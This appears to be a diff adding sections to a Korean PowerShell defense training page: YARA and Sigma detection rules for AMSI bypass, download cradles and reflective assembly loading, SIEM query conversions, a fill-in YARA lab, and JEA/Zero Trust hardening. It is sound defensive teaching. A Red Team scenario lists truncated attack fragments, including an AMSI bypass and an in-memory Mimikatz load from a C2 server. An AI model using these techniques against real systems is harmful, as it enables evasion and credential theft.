+                <div class="text-white ml-8">$ref1 = <span class="text-green-400">"AmsiUtils"</span> <span class="text-purple-400">nocase</span></div>
+                <div class="text-white ml-8">$ref2 = <span class="text-green-400">"amsiInitFailed"</span> <span class="text-purple-400">nocase</span></div>
+                <div class="text-white ml-8">$ref3 = <span class="text-green-400">"AmsiScanBuffer"</span></div>
+                <div class="text-white ml-8"><span class="text-slate-500">// VirtualProtect + amsi 조합</span></div>
+                <div class="text-white ml-8">$vp = <span class="text-green-400">"VirtualProtect"</span></div>
+                <div class="text-white ml-8">$amsi = <span class="text-green-400">"amsi.dll"</span> <span class="text-purple-400">nocase</span></div>
+                <div class="text-white ml-4"><span class="text-purple-400">condition:</span></div>
+                <div class="text-white ml-8">$patch_bytes <span class="text-purple-400">or</span> ($ref1 <span class="text-purple-400">and</span> $ref2) <span class="text-purple-400">or</span> ($vp <span class="text-purple-400">and</span> $amsi <span class="text-purple-400">and</span> $ref3)</div>
+                <div class="text-white">}</div>
+            </div>
+        </div>
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-teal-400">
+            <h3 class="font-bold text-xl mb-4 hl-teal">YARA 규칙 3: .NET Assembly 메모리 로딩 탐지</h3>
+            <div class="terminal-bg rounded-lg p-4 text-xs leading-relaxed overflow-x-auto">
+                <div class="text-purple-400">rule</div> <span class="text-yellow-400">Detect_Reflective_Assembly_Load</span> {
+                <div class="text-white ml-4"><span class="text-purple-400">meta:</span></div>
+                <div class="text-white ml-8">description = <span class="text-green-400">"Reflective .NET Assembly 로딩 탐지"</span></div>
+                <div class="text-white ml-4"><span class="text-purple-400">strings:</span></div>
+                <div class="text-white ml-8">$load1 = <span class="text-green-400">"[Reflection.Assembly]::Load"</span> <span class="text-purple-400">nocase</span></div>
+                <div class="text-white ml-8">$load2 = <span class="text-green-400">"System.Reflection.Assembly"</span></div>
+                <div class="text-white ml-8">$b64 = <span class="text-green-400">"FromBase64String"</span></div>
+                <div class="text-white ml-8">$wc = <span class="text-green-400">"DownloadData"</span></div>
+                <div class="text-white ml-8">$pe_header = { 4D 5A 90 00 }  <span class="text-slate-500">// MZ 헤더</span></div>
+                <div class="text-white ml-4"><span class="text-purple-400">condition:</span></div>
+                <div class="text-white ml-8">($load1 <span class="text-purple-400">or</span> $load2) <span class="text-purple-400">and</span> ($b64 <span class="text-purple-400">or</span> $wc <span class="text-purple-400">or</span> $pe_header)</div>
+                <div class="text-white">}</div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ═══════════════════ Mini Lab 2: YARA 규칙 빈칸 채우기 ═══════════════════ -->
+<section id="minilab2" class="scroll-mt-12 opacity-0 transform translate-y-10 transition-all duration-700 section-observe">
+    <h2 class="text-2xl font-bold mb-6 flex items-center gap-2 border-b border-emerald-400 pb-2 text-[#1e293b] dark:text-white"><span class="text-emerald-500">🧪</span> Mini Lab 2 — YARA 규칙 빈칸 채우기</h2>
+    <div class="glass-panel p-6 rounded-xl">
+        <p class="text-sm text-cgray dark:text-slate-400 mb-4">아래 YARA 규칙의 빈칸을 채워 PowerShell 다운로드 크래들(Download Cradle)을 탐지하는 규칙을 완성하세요.</p>
+        <div class="terminal-bg rounded-lg p-4 text-xs mb-6">
+            <div class="text-purple-400">rule</div> <span class="text-yellow-400">PS_Download_Cradle</span> {
+            <div class="text-white ml-4"><span class="text-purple-400">strings:</span></div>
+            <div class="text-white ml-8">$s1 = <span class="text-green-400">"New-Object"</span></div>
+            <div class="text-white ml-8">$s2 = "<input id='lab2-a' class='w-40 px-2 py-1 bg-slate-700 border border-slate-500 rounded text-yellow-400 font-mono text-xs' placeholder='빈칸 A'>"</div>
+            <div class="text-white ml-8">$s3 = "<input id='lab2-b' class='w-40 px-2 py-1 bg-slate-700 border border-slate-500 rounded text-yellow-400 font-mono text-xs' placeholder='빈칸 B'>"</div>
+            <div class="text-white ml-4"><span class="text-purple-400">condition:</span></div>
+            <div class="text-white ml-8">$s1 <span class="text-purple-400">and</span> ($s2 <span class="text-purple-400">or</span> $s3)</div>
+            <div class="text-white">}</div>
+        </div>
+        <div class="bg-slate-100 dark:bg-slate-800 p-4 rounded-lg mb-4">
+            <div class="text-xs text-slate-600 dark:text-slate-400">
+                <strong>힌트:</strong> PowerShell 다운로드 크래들에서 자주 사용되는 두 가지 .NET 클래스를 생각하세요.
+                <br>A: 웹에서 데이터를 내려받는 클래스명 (Net.???)
+                <br>B: 문자열을 다운로드하는 메서드명 (Download???)
+            </div>
+        </div>
+        <div class="flex gap-3">
+            <button onclick="checkLab2()" class="bg-emerald-500 hover:bg-emerald-600 text-white font-bold py-2 px-6 rounded font-mono transition shadow-sm">정답 확인</button>
+            <button onclick="resetLab2()" class="bg-slate-300 dark:bg-slate-700 hover:bg-slate-400 dark:hover:bg-slate-600 text-slate-700 dark:text-slate-300 font-bold py-2 px-6 rounded font-mono transition shadow-sm">초기화</button>
+        </div>
+        <div id="lab2-result" class="hidden mt-4 p-4 rounded text-sm font-mono text-center font-bold shadow-sm"></div>
+    </div>
+</section>
+
+<!-- ═══════════════════ Chapter 10 ═══════════════════ -->
+<section id="ch10" class="scroll-mt-12 opacity-0 transform translate-y-10 transition-all duration-700 section-observe">
+    <h2 class="text-2xl font-bold mb-6 flex items-center gap-2 border-b border-red-400 pb-2 text-[#1e293b] dark:text-white"><span class="hl-red">#10.</span> Sigma 고급 탐지 — PowerShell 공격 체인 상관분석</h2>
+    <div class="space-y-6">
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-red-400 relative overflow-hidden">
+            <div class="absolute top-0 right-0 p-4 opacity-10 text-6xl">📋</div>
+            <h3 class="font-bold text-xl mb-4 hl-red">비유: CCTV 영상을 자동 분석하는 AI</h3>
+            <p class="text-sm text-cgray dark:text-slate-300 mb-4 leading-relaxed"><strong>Sigma</strong>는 SIEM에 독립적인 탐지 규칙 표준입니다. YARA가 바이트 패턴을 탐지한다면, Sigma는 <strong>로그 이벤트의 패턴</strong>을 탐지합니다. Splunk, Elastic, Azure Sentinel 등 어떤 SIEM으로든 변환 가능합니다.</p>
+        </div>
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-emerald-400">
+            <h3 class="font-bold text-xl mb-4 text-emerald-600 dark:text-emerald-400">Sigma 규칙 1: PowerShell 다운그레이드 탐지</h3>
+            <div class="terminal-bg rounded-lg p-4 text-xs leading-relaxed overflow-x-auto">
+                <div class="text-purple-400">title:</div> <span class="text-green-400">PowerShell Downgrade Attack</span>
+                <div class="text-purple-400">id:</div> <span class="text-green-400">6331d376-9a01-4a2c-b0c3-4e5e8c5a5a3d</span>
+                <div class="text-purple-400">status:</div> <span class="text-green-400">stable</span>
+                <div class="text-purple-400">level:</div> <span class="text-red-400">high</span>
+                <div class="text-purple-400">logsource:</div>
+                <div class="text-white ml-4"><span class="text-purple-400">product:</span> <span class="text-green-400">windows</span></div>
+                <div class="text-white ml-4"><span class="text-purple-400">service:</span> <span class="text-green-400">powershell-classic</span></div>
+                <div class="text-purple-400">detection:</div>
+                <div class="text-white ml-4"><span class="text-purple-400">selection:</span></div>
+                <div class="text-white ml-8"><span class="text-purple-400">EventID:</span> <span class="text-orange-400">400</span></div>
+                <div class="text-white ml-8"><span class="text-purple-400">EngineVersion|startswith:</span> <span class="text-green-400">'2.'</span></div>
+                <div class="text-white ml-4"><span class="text-purple-400">condition:</span> <span class="text-green-400">selection</span></div>
+            </div>
+        </div>
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-purple-400">
+            <h3 class="font-bold text-xl mb-4 text-purple-700 dark:text-purple-400">Sigma 규칙 2: 의심스러운 PowerShell 커맨드라인</h3>
+            <div class="terminal-bg rounded-lg p-4 text-xs leading-relaxed overflow-x-auto">
+                <div class="text-purple-400">title:</div> <span class="text-green-400">Suspicious PowerShell Command Line</span>
+                <div class="text-purple-400">level:</div> <span class="text-red-400">high</span>
+                <div class="text-purple-400">logsource:</div>
+                <div class="text-white ml-4"><span class="text-purple-400">category:</span> <span class="text-green-400">process_creation</span></div>
+                <div class="text-white ml-4"><span class="text-purple-400">product:</span> <span class="text-green-400">windows</span></div>
+                <div class="text-purple-400">detection:</div>
+                <div class="text-white ml-4"><span class="text-purple-400">selection_process:</span></div>
+                <div class="text-white ml-8"><span class="text-purple-400">Image|endswith:</span> <span class="text-green-400">'\powershell.exe'</span></div>
+                <div class="text-white ml-4"><span class="text-purple-400">selection_flags:</span></div>
+                <div class="text-white ml-8"><span class="text-purple-400">CommandLine|contains|all:</span></div>
+                <div class="text-white ml-12">- <span class="text-green-400">'-NoP'</span></div>
+                <div class="text-white ml-12">- <span class="text-green-400">'-W Hidden'</span></div>
+                <div class="text-white ml-4"><span class="text-purple-400">selection_payload:</span></div>
+                <div class="text-white ml-8"><span class="text-purple-400">CommandLine|contains:</span></div>
+                <div class="text-white ml-12">- <span class="text-green-400">'-enc '</span></div>
+                <div class="text-white ml-12">- <span class="text-green-400">'IEX'</span></div>
+                <div class="text-white ml-12">- <span class="text-green-400">'Invoke-Expression'</span></div>
+                <div class="text-white ml-12">- <span class="text-green-400">'DownloadString'</span></div>
+                <div class="text-white ml-12">- <span class="text-green-400">'DownloadData'</span></div>
+                <div class="text-white ml-4"><span class="text-purple-400">condition:</span> <span class="text-green-400">selection_process and selection_flags and selection_payload</span></div>
+            </div>
+        </div>
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-amber-400">
+            <h3 class="font-bold text-xl mb-4 text-amber-700 dark:text-amber-400">Sigma 규칙 3: AMSI 우회 탐지 (Script Block Logging)</h3>
+            <div class="terminal-bg rounded-lg p-4 text-xs leading-relaxed overflow-x-auto">
+                <div class="text-purple-400">title:</div> <span class="text-green-400">AMSI Bypass Attempt via Script Block</span>
+                <div class="text-purple-400">level:</div> <span class="text-red-400">critical</span>
+                <div class="text-purple-400">logsource:</div>
+                <div class="text-white ml-4"><span class="text-purple-400">product:</span> <span class="text-green-400">windows</span></div>
+                <div class="text-white ml-4"><span class="text-purple-400">service:</span> <span class="text-green-400">powershell</span></div>
+                <div class="text-purple-400">detection:</div>
+                <div class="text-white ml-4"><span class="text-purple-400">selection:</span></div>
+                <div class="text-white ml-8"><span class="text-purple-400">EventID:</span> <span class="text-orange-400">4104</span></div>
+                <div class="text-white ml-8"><span class="text-purple-400">ScriptBlockText|contains:</span></div>
+                <div class="text-white ml-12">- <span class="text-green-400">'AmsiUtils'</span></div>
+                <div class="text-white ml-12">- <span class="text-green-400">'amsiInitFailed'</span></div>
+                <div class="text-white ml-12">- <span class="text-green-400">'AmsiScanBuffer'</span></div>
+                <div class="text-white ml-12">- <span class="text-green-400">'VirtualProtect'</span></div>
+                <div class="text-white ml-4"><span class="text-purple-400">condition:</span> <span class="text-green-400">selection</span></div>
+            </div>
+        </div>
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-teal-400">
+            <h3 class="font-bold text-xl mb-4 hl-teal">Sigma → SIEM 변환 실전 예시</h3>
+            <p class="text-sm text-cgray dark:text-slate-300 mb-4 leading-relaxed">Sigma 규칙의 진짜 가치는 <strong>어떤 SIEM이든 자동 변환</strong>이 가능하다는 점입니다. 위의 규칙 3을 각 SIEM 쿼리로 변환한 결과를 비교합니다.</p>
+            <div class="terminal-bg rounded-lg p-4 text-xs leading-relaxed overflow-x-auto mb-4">
+                <div class="text-slate-500"># Sigma CLI 변환 명령어</div>
+                <div class="text-white">$ sigma convert -t splunk -p sysmon rules/amsi_bypass.yml</div>
+                <div class="text-white">$ sigma convert -t elasticsearch -p ecs_windows rules/amsi_bypass.yml</div>
+                <div class="text-white">$ sigma convert -t microsoft365defender rules/amsi_bypass.yml</div>
+            </div>
+            <div class="space-y-4">
+                <div class="bg-orange-50 dark:bg-orange-900/20 p-4 rounded-lg border border-orange-300 dark:border-orange-700">
+                    <div class="font-bold text-xs text-orange-700 dark:text-orange-400 mb-2">Splunk SPL 변환 결과</div>
+                    <div class="terminal-bg rounded p-3 text-xs overflow-x-auto">
+                        <div class="text-white">source=<span class="text-green-400">"WinEventLog:Microsoft-Windows-PowerShell/Operational"</span></div>
+                        <div class="text-white">EventCode=<span class="text-orange-400">4104</span></div>
+                        <div class="text-white">(ScriptBlockText=<span class="text-green-400">"*AmsiUtils*"</span></div>
+                        <div class="text-white"> OR ScriptBlockText=<span class="text-green-400">"*amsiInitFailed*"</span></div>
+                        <div class="text-white"> OR ScriptBlockText=<span class="text-green-400">"*AmsiScanBuffer*"</span></div>
+                        <div class="text-white"> OR ScriptBlockText=<span class="text-green-400">"*VirtualProtect*"</span>)</div>
+                        <div class="text-white">| table _time, host, ScriptBlockText, UserID</div>
+                    </div>
+                </div>
+                <div class="bg-blue-50 dark:bg-blue-900/20 p-4 rounded-lg border border-blue-300 dark:border-blue-700">
+                    <div class="font-bold text-xs text-blue-700 dark:text-blue-400 mb-2">Elastic (ECS) KQL 변환 결과</div>
+                    <div class="terminal-bg rounded p-3 text-xs overflow-x-auto">
+                        <div class="text-white">event.code: <span class="text-orange-400">4104</span> <span class="text-purple-400">and</span></div>
+                        <div class="text-white">powershell.scriptblock.text: (</div>
+                        <div class="text-white">    <span class="text-green-400">"AmsiUtils"</span> <span class="text-purple-400">or</span> <span class="text-green-400">"amsiInitFailed"</span></div>
+                        <div class="text-white">    <span class="text-purple-400">or</span> <span class="text-green-400">"AmsiScanBuffer"</span> <span class="text-purple-400">or</span> <span class="text-green-400">"VirtualProtect"</span></div>
+                        <div class="text-white">)</div>
+                    </div>
+                </div>
+                <div class="bg-purple-50 dark:bg-purple-900/20 p-4 rounded-lg border border-purple-300 dark:border-purple-700">
+                    <div class="font-bold text-xs text-purple-700 dark:text-purple-400 mb-2">Microsoft 365 Defender (KQL) 변환 결과</div>
+                    <div class="terminal-bg rounded p-3 text-xs overflow-x-auto">
+                        <div class="text-white">DeviceEvents</div>
+                        <div class="text-white">| <span class="text-purple-400">where</span> ActionType == <span class="text-green-400">"PowerShellCommand"</span></div>
+                        <div class="text-white">| <span class="text-purple-400">where</span> AdditionalFields <span class="text-purple-400">has_any</span> (</div>
+                        <div class="text-white">    <span class="text-green-400">"AmsiUtils"</span>, <span class="text-green-400">"amsiInitFailed"</span>,</div>
+                        <div class="text-white">    <span class="text-green-400">"AmsiScanBuffer"</span>, <span class="text-green-400">"VirtualProtect"</span>)</div>
+                        <div class="text-white">| <span class="text-purple-400">project</span> Timestamp, DeviceName, InitiatingProcessAccountName</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-red-400">
+            <h3 class="font-bold text-xl mb-4 hl-red">Sigma 규칙 4: .NET Assembly 메모리 로딩 탐지</h3>
+            <div class="terminal-bg rounded-lg p-4 text-xs leading-relaxed overflow-x-auto">
+                <div class="text-purple-400">title:</div> <span class="text-green-400">Reflective .NET Assembly Load via PowerShell</span>
+                <div class="text-purple-400">id:</div> <span class="text-green-400">a7c91f2d-84e5-4bb1-9d6c-1ef35a98c7e4</span>
+                <div class="text-purple-400">status:</div> <span class="text-green-400">experimental</span>
+                <div class="text-purple-400">level:</div> <span class="text-red-400">critical</span>
+                <div class="text-purple-400">description:</div> <span class="text-green-400">PowerShell Script Block에서 .NET Assembly 리플렉션 로딩 패턴 탐지</span>
+                <div class="text-purple-400">logsource:</div>
+                <div class="text-white ml-4"><span class="text-purple-400">product:</span> <span class="text-green-400">windows</span></div>
+                <div class="text-white ml-4"><span class="text-purple-400">service:</span> <span class="text-green-400">powershell</span></div>
+                <div class="text-purple-400">detection:</div>
+                <div class="text-white ml-4"><span class="text-purple-400">selection_event:</span></div>
+                <div class="text-white ml-8"><span class="text-purple-400">EventID:</span> <span class="text-orange-400">4104</span></div>
+                <div class="text-white ml-4"><span class="text-purple-400">selection_reflection:</span></div>
+                <div class="text-white ml-8"><span class="text-purple-400">ScriptBlockText|contains:</span></div>
+                <div class="text-white ml-12">- <span class="text-green-400">'[Reflection.Assembly]::Load'</span></div>
+                <div class="text-white ml-12">- <span class="text-green-400">'[System.Reflection.Assembly]::Load'</span></div>
+                <div class="text-white ml-4"><span class="text-purple-400">selection_delivery:</span></div>
+                <div class="text-white ml-8"><span class="text-purple-400">ScriptBlockText|contains:</span></div>
+                <div class="text-white ml-12">- <span class="text-green-400">'DownloadData'</span></div>
+                <div class="text-white ml-12">- <span class="text-green-400">'FromBase64String'</span></div>
+                <div class="text-white ml-12">- <span class="text-green-400">'IO.MemoryStream'</span></div>
+                <div class="text-white ml-4"><span class="text-purple-400">condition:</span> <span class="text-green-400">selection_event and selection_reflection and selection_delivery</span></div>
+                <div class="text-purple-400">falsepositives:</div>
+                <div class="text-white ml-4">- <span class="text-green-400">Legitimate PowerShell modules loading assemblies</span></div>
+                <div class="text-white ml-4">- <span class="text-green-400">Software deployment tools</span></div>
+                <div class="text-purple-400">tags:</div>
+                <div class="text-white ml-4">- <span class="text-green-400">attack.execution</span></div>
+                <div class="text-white ml-4">- <span class="text-green-400">attack.t1059.001</span></div>
+                <div class="text-white ml-4">- <span class="text-green-400">attack.defense_evasion</span></div>
+            </div>
+        </div>
+        <div class="glass-panel p-6 rounded-xl">
+            <h3 class="font-bold text-lg mb-4 hl-red">Sigma 상관분석: 공격 체인 탐지</h3>
+            <p class="text-sm text-cgray dark:text-slate-300 mb-3 leading-relaxed">단일 규칙보다는 <strong>여러 규칙을 연계한 상관분석(Correlation)</strong>이 훨씬 정확합니다. 아래는 PowerShell 공격 체인의 전형적인 탐지 흐름입니다.</p>
+            <div class="space-y-3">
+                <div class="flex items-center gap-3">
+                    <div class="bg-red-500 text-white px-3 py-1 rounded-full text-xs font-bold shrink-0 node-pulse">1단계</div>
+                    <div class="bg-slate-50 dark:bg-slate-800/50 p-3 rounded-lg flex-1 border border-slate-200 dark:border-slate-700">
+                        <div class="text-xs font-bold text-slate-700 dark:text-slate-300">초기 실행 탐지</div>
+                        <div class="text-[10px] text-slate-500 dark:text-slate-400">Sysmon EID 1: powershell.exe -NoP -W Hidden -enc ...</div>
+                    </div>
+                </div>
+                <div class="flex items-center gap-3">
+                    <div class="bg-orange-500 text-white px-3 py-1 rounded-full text-xs font-bold shrink-0">2단계</div>
+                    <div class="bg-slate-50 dark:bg-slate-800/50 p-3 rounded-lg flex-1 border border-slate-200 dark:border-slate-700">
+                        <div class="text-xs font-bold text-slate-700 dark:text-slate-300">AMSI 우회 시도</div>
+                        <div class="text-[10px] text-slate-500 dark:text-slate-400">EID 4104: AmsiUtils / amsiInitFailed 키워드</div>
+                    </div>
+                </div>
+                <div class="flex items-center gap-3">
+                    <div class="bg-amber-500 text-white px-3 py-1 rounded-full text-xs font-bold shrink-0">3단계</div>
+                    <div class="bg-slate-50 dark:bg-slate-800/50 p-3 rounded-lg flex-1 border border-slate-200 dark:border-slate-700">
+                        <div class="text-xs font-bold text-slate-700 dark:text-slate-300">페이로드 다운로드</div>
+                        <div class="text-[10px] text-slate-500 dark:text-slate-400">EID 4104: DownloadString / DownloadData + 외부 URL</div>
+                    </div>
+                </div>
+                <div class="flex items-center gap-3">
+                    <div class="bg-purple-500 text-white px-3 py-1 rounded-full text-xs font-bold shrink-0">4단계</div>
+                    <div class="bg-slate-50 dark:bg-slate-800/50 p-3 rounded-lg flex-1 border border-slate-200 dark:border-slate-700">
+                        <div class="text-xs font-bold text-slate-700 dark:text-slate-300">어셈블리 로딩 + 실행</div>
+                        <div class="text-[10px] text-slate-500 dark:text-slate-400">EID 4104: Assembly::Load + Sysmon EID 7: clrjit.dll 로드</div>
+                    </div>
+                </div>
+                <div class="flex items-center gap-3">
+                    <div class="bg-blue-500 text-white px-3 py-1 rounded-full text-xs font-bold shrink-0">5단계</div>
+                    <div class="bg-slate-50 dark:bg-slate-800/50 p-3 rounded-lg flex-1 border border-slate-200 dark:border-slate-700">
+                        <div class="text-xs font-bold text-slate-700 dark:text-slate-300">측면 이동 (Lateral Movement)</div>
+                        <div class="text-[10px] text-slate-500 dark:text-slate-400">네트워크 로그: WinRM 5985 연결 / WMI DCOM 트래픽</div>
+                    </div>
+                </div>
+            </div>
+            <div class="mt-4 bg-amber-50 dark:bg-amber-900/20 p-3 rounded-lg border border-amber-300 dark:border-amber-700">
+                <div class="text-xs text-amber-700 dark:text-amber-400"><strong>SIEM 팁:</strong> 각 단계의 이벤트를 시간 윈도우(예: 5분)로 묶어 상관분석하면, 오탐(False Positive)을 대폭 줄일 수 있습니다. Elastic의 <code class="bg-slate-200 dark:bg-slate-700 px-1 rounded">detection-rules</code> 또는 Splunk의 <code class="bg-slate-200 dark:bg-slate-700 px-1 rounded">Risk-Based Alerting</code>을 활용하세요.</div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ═══════════════════ Chapter 11 ═══════════════════ -->
+<section id="ch11" class="scroll-mt-12 opacity-0 transform translate-y-10 transition-all duration-700 section-observe">
+    <h2 class="text-2xl font-bold mb-6 flex items-center gap-2 border-b border-red-400 pb-2 text-[#1e293b] dark:text-white"><span class="hl-red">#11.</span> 엔터프라이즈 방어 — JEA, PowerShell v7, Zero Trust</h2>
+    <div class="space-y-6">
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-red-400 relative overflow-hidden">
+            <div class="absolute top-0 right-0 p-4 opacity-10 text-6xl">🏢</div>
+            <h3 class="font-bold text-xl mb-4 hl-red">비유: 군사 기지의 다층 방어 체계</h3>
+            <p class="text-sm text-cgray dark:text-slate-300 mb-4 leading-relaxed">개별 우회 기법을 막는 것만으로는 불충분합니다. 엔터프라이즈 환경에서는 <strong>JEA(Just Enough Administration)</strong>, <strong>PowerShell v7 보안 기능</strong>, <strong>Zero Trust 아키텍처</strong>를 결합한 다층 방어가 필요합니다.</p>
+        </div>
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-emerald-400">
+            <h3 class="font-bold text-xl mb-4 text-emerald-600 dark:text-emerald-400">JEA (Just Enough Administration) 구성</h3>
+            <p class="text-sm text-cgray dark:text-slate-300 mb-3 leading-relaxed">JEA는 PowerShell 원격 세션에서 사용자가 실행할 수 있는 명령을 <strong>화이트리스트</strong>로 제한합니다. 관리자라도 허용된 cmdlet만 사용할 수 있습니다.</p>
+            <div class="terminal-bg rounded-lg p-4 text-xs leading-relaxed overflow-x-auto">
+                <div class="text-slate-500"># JEA Role Capability 파일 (.psrc) 예시</div>
+                <div class="text-white">@{</div>
+                <div class="text-white ml-4"><span class="text-slate-500"># 허용된 명령만 정의</span></div>
+                <div class="text-white ml-4">VisibleCmdlets = @(</div>
+                <div class="text-white ml-8"><span class="text-green-400">'Get-Service'</span>,</div>
+                <div class="text-white ml-8"><span class="text-green-400">'Restart-Service'</span>,</div>
+                <div class="text-white ml-8"><span class="text-green-400">'Get-Process'</span></div>
+                <div class="text-white ml-4">)</div>
+                <div class="text-white ml-4"><span class="text-slate-500"># 차단: Invoke-Expression, Add-Type, New-Object 등</span></div>
+                <div class="text-white ml-4">VisibleExternalCommands = @()  <span class="text-slate-500"># 외부 명령 차단</span></div>
+                <div class="text-white ml-4">LanguageMode = <span class="text-green-400">'NoLanguage'</span>  <span class="text-slate-500"># 스크립팅 완전 차단</span></div>
+                <div class="text-white">}</div>
+            </div>
+        </div>
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-purple-400">
+            <h3 class="font-bold text-xl mb-4 text-purple-700 dark:text-purple-400">PowerShell v7+ 보안 강화 기능</h3>
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div class="bg-purple-50 dark:bg-purple-900/20 p-4 rounded-lg border border-purple-300 dark:border-purple-700">
+                    <div class="font-bold text-sm text-purple-700 dark:text-purple-400 mb-2">새로운 보안 기능</div>
+                    <ul class="text-xs text-slate-600 dark:text-slate-400 space-y-1">
+                        <li>• <strong>SSH 기반 원격</strong> (WinRM 대체)</li>
+                        <li>• <strong>개선된 로깅</strong> (Operational Log 확장)</li>
+                        <li>• <strong>WDAC 완전 지원</strong></li>
+                        <li>• <strong>SecretManagement 모듈</strong> (자격증명 보호)</li>
+                    </ul>
+                </div>
+                <div class="bg-purple-50 dark:bg-purple-900/20 p-4 rounded-lg border border-purple-300 dark:border-purple-700">
+                    <div class="font-bold text-sm text-purple-700 dark:text-purple-400 mb-2">GPO 필수 설정</div>
+                    <ul class="text-xs text-slate-600 dark:text-slate-400 space-y-1">
+                        <li>• Script Block Logging: <strong>활성화</strong></li>
+                        <li>• Module Logging: <strong>활성화</strong></li>
+                        <li>• Transcription: <strong>활성화</strong></li>
+                        <li>• ExecutionPolicy: <strong>AllSigned</strong></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-amber-400">
+            <h3 class="font-bold text-xl mb-4 text-amber-700 dark:text-amber-400">Zero Trust 원칙 적용</h3>
+            <div class="terminal-bg rounded-lg p-4 text-xs leading-relaxed overflow-x-auto">
+                <div class="text-slate-500"># Zero Trust PowerShell 보안 체크리스트</div>
+                <div class="text-white"></div>
+                <div class="text-green-400">[✓] .NET Framework 2.0/3.5 완전 제거</div>
+                <div class="text-green-400">[✓] PowerShell v2 비활성화</div>
+                <div class="text-green-400">[✓] WDAC 코드 무결성 정책 적용</div>
+                <div class="text-green-400">[✓] Script Block Logging + Transcription 활성화</div>
+                <div class="text-green-400">[✓] JEA로 원격 관리 세션 최소 권한 적용</div>
+                <div class="text-green-400">[✓] 네트워크 세그멘테이션 (WinRM 5985 포트 제한)</div>
+                <div class="text-green-400">[✓] Sysmon 배포 (EID 1, 7, 8, 10 수집)</div>
+                <div class="text-green-400">[✓] AMSI 무결성 모니터링 (ETW 기반)</div>
+                <div class="text-green-400">[✓] EDR 솔루션의 PowerShell 행위 탐지 활성화</div>
+                <div class="text-green-400">[✓] 정기 Purple Team 연습 (분기 1회)</div>
+            </div>
+        </div>
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-red-400">
+            <h3 class="font-bold text-xl mb-4 hl-red">Red Team vs Blue Team 시나리오</h3>
+            <p class="text-sm text-cgray dark:text-slate-300 mb-4 leading-relaxed">실제 공격과 방어 시나리오를 통해, 각 보안 기능이 어떻게 공격을 차단하는지 확인합니다.</p>
+            <div class="grid grid-cols-1 lg:grid-cols-2 gap-4">
+                <div class="bg-red-50 dark:bg-red-900/20 p-4 rounded-lg border border-red-300 dark:border-red-700">
+                    <div class="font-bold text-sm text-red-700 dark:text-red-400 mb-3 flex items-center gap-2">🔴 Red Team 공격 체인</div>
+                    <div class="space-y-3 text-xs text-slate-600 dark:text-slate-400">
+                        <div class="flex gap-2 items-start">
+                            <span class="bg-red-200 dark:bg-red-800/50 text-red-700 dark:text-red-400 px-1.5 py-0.5 rounded text-[10px] font-bold shrink-0">Step 1</span>
+                            <span>피싱 이메일의 악성 매크로가 PowerShell 실행<br><code class="bg-slate-200 dark:bg-slate-700 px-1 rounded text-[10px]">powershell -NoP -W Hidden -enc JABj...</code></span>
+                        </div>
+                        <div class="flex gap-2 items-start">
+                            <span class="bg-red-200 dark:bg-red-800/50 text-red-700 dark:text-red-400 px-1.5 py-0.5 rounded text-[10px] font-bold shrink-0">Step 2</span>
+                            <span>AMSI 우회: amsiInitFailed = true<br><code class="bg-slate-200 dark:bg-slate-700 px-1 rounded text-[10px]">[Ref].Assembly...amsiInitFailed = $true</code></span>
+                        </div>
+                        <div class="flex gap-2 items-start">
+                            <span class="bg-red-200 dark:bg-red-800/50 text-red-700 dark:text-red-400 px-1.5 py-0.5 rounded text-[10px] font-bold shrink-0">Step 3</span>
+                            <span>C2 서버에서 Mimikatz 메모리 로딩<br><code class="bg-slate-200 dark:bg-slate-700 px-1 rounded text-[10px]">Assembly::Load(DownloadData(url))</code></span>
+                        </div>
+                        <div class="flex gap-2 items-start">
+                            <span class="bg-red-200 dark:bg-red-800/50 text-red-700 dark:text-red-400 px-1.5 py-0.5 rounded text-[10px] font-bold shrink-0">Step 4</span>
+                            <span>자격증명 덤프 후 WMI로 측면 이동<br><code class="bg-slate-200 dark:bg-slate-700 px-1 rounded text-[10px]">Invoke-WmiMethod -ComputerName DC01</code></span>
+                        </div>
+                    </div>
+                </div>
+                <div class="bg-blue-50 dark:bg-blue-900/20 p-4 rounded-lg border border-blue-300 dark:border-blue-700">
+                    <div class="font-bold text-sm text-blue-700 dark:text-blue-400 mb-3 flex items-center gap-2">🔵 Blue Team 방어 대응</div>
+                    <div class="space-y-3 text-xs text-slate-600 dark:text-slate-400">
+                        <div class="flex gap-2 items-start">
+                            <span class="bg-blue-200 dark:bg-blue-800/50 text-blue-700 dark:text-blue-400 px-1.5 py-0.5 rounded text-[10px] font-bold shrink-0">Block 1</span>
+                            <span>Sysmon EID 1 → 의심 커맨드라인 탐지<br><strong>Sigma 규칙 2</strong>가 즉시 알림 발생</span>
+                        </div>
+                        <div class="flex gap-2 items-start">
+                            <span class="bg-blue-200 dark:bg-blue-800/50 text-blue-700 dark:text-blue-400 px-1.5 py-0.5 rounded text-[10px] font-bold shrink-0">Block 2</span>
+                            <span>EID 4104 Script Block Logging이 우회 코드 기록<br><strong>Sigma 규칙 3</strong>이 AMSI 우회 탐지</span>
+                        </div>
+                        <div class="flex gap-2 items-start">
+                            <span class="bg-blue-200 dark:bg-blue-800/50 text-blue-700 dark:text-blue-400 px-1.5 py-0.5 rounded text-[10px] font-bold shrink-0">Block 3</span>
+                            <span>WDAC가 서명되지 않은 Assembly 로딩 차단<br><strong>CLM</strong>이 Reflection API 호출 제한</span>
+                        </div>
+                        <div class="flex gap-2 items-start">
+                            <span class="bg-blue-200 dark:bg-blue-800/50 text-blue-700 dark:text-blue-400 px-1.5 py-0.5 rounded text-[10px] font-bold shrink-0">Block 4</span>
